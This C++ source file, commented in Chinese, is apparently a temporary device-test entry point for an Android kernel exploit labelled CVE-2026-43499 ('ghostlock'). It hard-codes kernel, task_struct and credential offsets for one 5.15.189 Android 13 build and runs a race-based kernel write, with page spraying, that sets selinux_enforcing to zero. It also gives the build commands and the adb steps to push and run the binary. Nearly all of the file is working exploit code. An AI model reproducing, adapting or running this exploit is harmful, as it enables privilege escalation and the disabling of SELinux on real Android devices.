/**
 * @file main_dev.cpp
 * @brief 临时真机入口：写死 5.15.189 配置，不解析 profile，验证重构后的
 *        multicast 单次写（W1: SELinux enforcing -> 0）。
 *
 * 配置来源（用户提供）：
 *   release = 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
 *   route   = multicast_waiter { waiter_off=96 buffer_size=264
 *                                task_offset=48 lock_offset=56 compact_waiter=1 }
 *   offset  = init_task/init_cred/empty_zero_page/root_task_group/
 *             selinux_enforcing/selinux_blob_sizes/security_hook_heads/
 *             slide_nfulnl_logger/slide_boot_id/slide_loggers_0_1
 *
 * 目标：data_alias(KIMAGE_TEXT_BASE + selinux_enforcing)，写入 0
 *       （WriteMode::Zero, leaf=0 / preserve_child=true，与 legacy W1 相同）。
 *
 * 构建（不经过 Gradle/CMake，临时产物）：
 *
 *   NDK=$HOME/Library/Android/sdk/ndk/30.0.16248370
 *   # KernelSnitch 的 C 桥必须用 C 编（该头用了 GNU typeof）
 *   $NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android24-clang \
 *     -std=gnu11 -O2 -fPIC -D__ARM -I app/src/main/cpp/glgeneral \
 *     -c app/src/main/cpp/gl43499/core/ks_bridge.c -o /tmp/ks_bridge.o
 *   $NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android24-clang++ \
 *     -std=c++23 -O2 -fPIE -pie -D__ARM -static-libstdc++ \
 *     -I app/src/main/cpp/gl43499/core \
 *     app/src/main/cpp/gl43499/core/[all].cpp \
 *     app/src/main/cpp/gl43499/dev/main_dev.cpp /tmp/ks_bridge.o \
 *     -o build/ghostlock-core-dev
 *
 *   adb push build/ghostlock-core-dev /data/local/tmp/
 *   adb shell chmod 755 /data/local/tmp/ghostlock-core-dev
 *   adb shell /data/local/tmp/ghostlock-core-dev
 *
 * @note 临时入口：真机验证通过后删除，不进入生产构建。
 */
#include <cstdio>
#include <cstdint>
#include <fcntl.h>
#include <unistd.h>
#include <csignal>

#include "backend.h"
#include "log.h"
#include "memory.h"
#include "params.h"
#include "profile.h"
#include "race.h"
#include "route.h"
#include "session.h"
#include "support.h"
#include "target.h"

namespace {
    void on_fatal_signal(int sig) {
        const char *msg = "[dev] fatal signal caught\n";
        (void)!write(STDOUT_FILENO, msg, 26);
        _exit(128 + sig);
    }
} // namespace

namespace {
    constexpr const char *kRelease =
        "5.15.189-android13-8-00016-g51bba4309aac-ab14546557";

    constexpr std::uint64_t kInitTaskOff = 46412800ULL;
    constexpr std::uint64_t kInitCredOff = 46126472ULL;
    constexpr std::uint64_t kEmptyZeroPageOff = 47529984ULL;
    constexpr std::uint64_t kRootTaskGroupOff = 47549120ULL;
    constexpr std::uint64_t kSelinuxEnforcingOff = 47885704ULL;
    constexpr std::uint64_t kSelinuxBlobSizesOff = 35027656ULL;
    constexpr std::uint64_t kSecurityHookHeadsOff = 35018304ULL;
    constexpr std::uint64_t kSlideNfulnlLoggerOff = 45096488ULL;
    constexpr std::uint64_t kSlideBootIdOff = 47999001ULL;
    constexpr std::uint64_t kSlideLoggers01Off = 45096280ULL;

    std::int32_t read_enforce() {
        int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
        if (fd < 0) return -1;
        char value = 0;
        const ssize_t n = read(fd, &value, 1);
        close(fd);
        return n == 1 ? (value - '0') : -1;
    }
} // namespace

int main() {
    std::signal(SIGSEGV, on_fatal_signal);
    std::signal(SIGBUS, on_fatal_signal);
    std::signal(SIGABRT, on_fatal_signal);
    std::signal(SIGILL, on_fatal_signal);
    ghostlock::kernel::set_unbuffer();
    ghostlock::kernel::set_limit();
    ghostlock::kernel::pin_to_core(0);

    ghostlock::profile::kernel_offsets decoded{};
    decoded.uname_r = kRelease;
    decoded.route = static_cast<std::uint8_t>(
        ghostlock::profile::RouteKind::MulticastWaiter);
    decoded.meta.kernel_major = 5;
    decoded.meta.recommend_shizuku = 1;
    decoded.meta.fallback_route = static_cast<std::uint8_t>(
        ghostlock::profile::RouteKind::Auto);
    decoded.meta.safe_mode = 0;

    decoded.offsets.init_task = kInitTaskOff;
    decoded.offsets.init_cred = kInitCredOff;
    decoded.offsets.empty_zero_page = kEmptyZeroPageOff;
    decoded.offsets.root_task_group = kRootTaskGroupOff;
    decoded.offsets.selinux_enforcing = kSelinuxEnforcingOff;
    decoded.offsets.selinux_blob_sizes = kSelinuxBlobSizesOff;
    decoded.offsets.security_hook_heads = kSecurityHookHeadsOff;
    decoded.offsets.slide_nfulnl_logger = kSlideNfulnlLoggerOff;
    decoded.offsets.slide_boot_id = kSlideBootIdOff;
    decoded.offsets.slide_loggers_0_1 = kSlideLoggers01Off;

    decoded.geometry.mcast_waiter_off = 96;
    decoded.geometry.mcast_buffer_size = 264;
    decoded.geometry.mcast_task_offset = 48;
    decoded.geometry.mcast_lock_offset = 56;
    decoded.misc.compact_waiter = 1;
    decoded.misc.kernelsnitch_collisions = 8;
    decoded.misc.mm_struct_sz = 0x400;

    /* 5.15.189 task_struct offsets (STRUCT_OFFSETS_5_15, compact waiter). */
    decoded.task.prio = 0x7C;
    decoded.task.normal_prio = 0x84;
    decoded.task.sched_task_group = 0x400;
    decoded.task.pi_lock = 0x884;
    decoded.task.pi_waiters = 0x898;
    decoded.task.pi_top_task = 0x8A8;
    decoded.task.pi_blocked_on = 0x8B0;
    decoded.task.pid = 0x5D8;
    decoded.task.tgid = 0x5DC;
    decoded.task.atomic_flags = 0x598;
    decoded.task.real_cred = 0x790;
    decoded.task.cred = 0x798;
    decoded.task.comm = 0x7A8;
    decoded.task.tasks = 0x4D0;
    decoded.task.seccomp = 0x860;

    decoded.credential.copy_size = 0xb0;
    decoded.credential.usage_value = 0x100;
    decoded.credential.caps_offset = 0x30;
    decoded.credential.caps_count = 3;
    decoded.credential.caps_value = 0x000001ffffffffffULL;
    decoded.credential.ref_count = 4;
    decoded.credential.ref0_offset = 0x80;
    decoded.credential.ref1_offset = 0x88;
    decoded.credential.ref2_offset = 0x90;
    decoded.credential.ref3_offset = 0x98;
    decoded.credential.ref0_image = 0xffffffc00ab23a80ULL;
    decoded.credential.ref1_image = 0xffffffc00acce110ULL;
    decoded.credential.ref2_image = 0xffffffc00ab23ff0ULL;
    decoded.credential.ref3_image = 0xffffffc00ab23b28ULL;

    decoded.execution.recommended_main_cpu = 0;
    decoded.execution.recommended_consumer_cpu = 1;
    decoded.execution.heap_prepare_max_attempts = 6;
    decoded.execution.heap_prepare_timeout_ms = 240000;
    decoded.execution.heap_kernelsnitch_timeout_ms = 120000;
    decoded.execution.race_route_wait_ms = 1000;
    decoded.execution.race_route_done_timeout_ms = 300000;
    decoded.execution.race_setup_settle_us = 100000;
    decoded.execution.race_state_poll_interval_us = 1000;
    decoded.execution.select_enter_delay_us = 50000;
    decoded.execution.select_timeout_us = 200000;
    decoded.execution.select_consumer_burst_calls = 1;
    decoded.execution.select_consumer_max_calls = 1;
    decoded.execution.tcp_attempts = 2000;
    decoded.execution.tcp_arm_sequence = 16;
    decoded.execution.tcp_post_receive_hold_iterations = 20000;
    decoded.execution.mcast_attempts = 1;
    decoded.execution.mcast_arm_sequence = 1;
    decoded.execution.mcast_arm_hold = 100000000;

    auto &s = ghostlock::session::g_exploit_session;
    s.profile = ghostlock::profile::TargetProfile::from(&decoded);
    s.runtime.main_cpu = 0;
    s.runtime.consumer_cpu = 1;
    s.heap.init();
    s.race.main_cpu = 0;
    s.race.consumer_cpu = 1;

    if (s.addresses.init(&s.profile) != 0) {
        std::fprintf(stderr, "addresses init failed\n");
        return 2;
    }

    const std::uintptr_t image =
        ghostlock::kernel::KIMAGE_TEXT_BASE + kSelinuxEnforcingOff;
    const std::uintptr_t target = s.addresses.data_alias(image);
    const std::int32_t enforce_before = read_enforce();
    std::printf("release=%s\n", kRelease);
    std::printf("selinux_enforcing image=0x%016zx alias=0x%016zx enforce=%d\n",
                static_cast<std::size_t>(image),
                static_cast<std::size_t>(target), enforce_before);
    if (!target) {
        std::fprintf(stderr, "direct-map alias is zero; refusing\n");
        return 3;
    }

    const ghostlock::memory::WriteRequest request =
        ghostlock::memory::WriteRequest::make(
            target, ghostlock::memory::WriteMode::Zero, 0);
    ghostlock::core::PageSprayInputs spray =
        ghostlock::support::page_spray_inputs_from_session(request);
    ghostlock::core::RaceRunParams race =
        ghostlock::race::race_run_params_from_session(request, &spray);

    const auto t0 = ghostlock::runtime_time::monotonic_now();
    ghostlock::core::WriteInputs in{
        .request = request,
        .direct_map_base = ghostlock::kernel::DIRECT_MAP_BASE,
        .direct_map_end = ghostlock::kernel::g_direct_map_end,
        .spray = &spray,
        .race = &race,
        .desc = "dev W1: SELinux",
        .timer_start_ns = static_cast<std::uint64_t>(
            ghostlock::runtime_time::to_duration(t0).count()),
    };

    const std::int32_t routed =
        ghostlock::session::backend::Cve2026_43499Policy::attack_write<
            ghostlock::route::MulticastPolicy>(in);
    const std::int32_t enforce_after = read_enforce();
    std::printf("routed=%d enforce_before=%d enforce_after=%d\n", routed,
                enforce_before, enforce_after);
    return routed == 1 ? 0 : 1;
}
